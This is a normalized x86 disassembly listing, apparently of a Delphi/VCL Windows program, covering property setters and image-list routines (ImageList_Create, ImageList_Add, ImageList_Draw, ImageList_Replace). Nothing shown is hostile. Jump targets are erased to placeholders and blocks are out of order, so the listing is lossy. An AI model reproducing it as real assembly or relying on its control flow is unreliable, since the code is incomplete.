mov [ esp + 0x1 ] al
mov al [ esp ]
mov [ ebx + 0x58 ] al
cmp al 0x1
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
test edi edi
je r-xdata
dec al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
cmp [ esp + 0x1 ] 0x2
jne r-xdata
test edi edi
je r-xdata
jmp r-xdata
inc ebp
dec esi
jne r-xdata
mov dl [ edi + 0x94 ]
mov eax edi
call sub_446e50
cmp [ esp ] 0x2
jne r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov edi [ eax + ebp * 4 ]
mov al [ esp ]
sub al 0x1
jb r-xdata
mov al [ edi + 0x6a ]
mov [ edi + 0x94 ] al
mov dl 0x1
mov eax edi
call sub_446e50
sub_446b98
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41a358
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_446bec
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_403198
mov eax [ esi + 0x9c ]
call sub_403198
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44649c
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d3ac
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_446c3c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414738
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_446ce8
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_446d48
mov dl [ ebx + 0x6a ]
mov eax edi
call sub_446e50
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_446f88
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_446fe8
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_447044
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_4470a8
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446ce8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_4042f4
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403f3c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403348
test eax eax
je r-xdata
sub_446d48
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_446e40
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_446800
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403348
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_4467ec
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_446d48
sub_446e50
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403348
test eax eax
je r-xdata
sub_446ec8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_4042f4
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403f3c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414098
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_414098
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
sub_446f30
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403348
test eax eax
je r-xdata
sub_446f88
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_4042f4
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403f3c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403348
test eax eax
je r-xdata
sub_446fe8
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403348
test eax eax
je r-xdata
sub_447044
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_403348
test eax eax
je r-xdata
sub_4470a8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_414098
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_403348
test eax eax
je r-xdata
sub_447108
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_4042f4
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_419fa8
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_446ce8
sub_447154
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_44717c
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_446608
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_446d48
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_447210
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4156f8
mov edi eax
mov eax esi
call sub_44a0ec
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_44723c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_447280
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4472a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4472ac
retn
sub_4474f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a50
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_447544
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_419a50
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_447598
push ebx
push esi
push edi
call sub_403524
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_414180
mov edx eax
mov eax edi
call sub_448564
mov eax [ edi + 0x50 ]
call sub_403198
mov eax edi
call sub_4478f4
mov eax [ edi + 0x4c ]
call sub_403198
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419a9c
test bl bl
jle r-xdata
call sub_403198
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40350c
sub_447604
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4476b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_4484ec
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_4476d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4476b8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_4476d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_447771
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_423028
mov eax ebx
call sub_4224a8
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d618
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412be0
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4224a8
pop edx
call sub_41d9bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447778
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_447794
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_4476d0
pop ecx
pop edx
pop ebx
retn
sub_4477cc
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_4476bc
test al al
je r-xdata
mov eax esi
call sub_447e8c
mov eax esi
call sub_4476d0
mov eax esi
mov si 0xffef
call sub_403394
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_447810
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_4476bc
test al al
je r-xdata
mov eax esi
call sub_447e8c
mov eax esi
call sub_4476d0
mov eax esi
mov si 0xffef
call sub_403394
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_447854
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4478f4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_447794
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403394
sub_4478a0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_448474
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_422514
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4478f4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403394
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_447890
push eax
call ImageList_Destroy
sub_44792c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4479bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_4476bc
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4479c6
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov edx eax
mov eax ebx
call sub_447e98
sub_4479cc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447a7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447a5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4476c4
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4478a0
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4478a0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447a65
mov eax [ ebp - 0x10 ]
call sub_403198
retn
sub_447a98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447b97
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4478a0
push eax
mov eax [ ebp - 0x4 ]
call sub_447890
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b9e
mov eax [ ebp - 0xc ]
call sub_403198
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447b59
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_4233cc
mov eax [ ebp - 0x4 ]
call sub_4476c4
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_447880
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4478a0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403198
retn
sub_447bb4
push ebx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_447890
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_447bd8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_447def
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4476bc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447df6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f0c
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_448474
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_447a98
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
xor eax eax
push ebp
push sub_447da0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_447d80
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_447d63
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423278
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_4224a8
call sub_41dd60
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_447890
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_4224a8
call sub_41dd60
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_447890
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_447890
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447d6a
mov eax [ ebp - 0x10 ]
call sub_403198
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
sub_447e00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447e7f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_447bb4
cmp esi eax
jl r-xdata
mov eax ebx
call sub_4476bc
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
mov eax ebx
mov si 0xffef
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447e86
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
push esi
mov eax ebx
call sub_447890
push eax
call ImageList_Remove
sub_447e98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4476bc
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_4474b8
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403394
pop esi
pop ebx
retn
sub_447ed0
push ebx
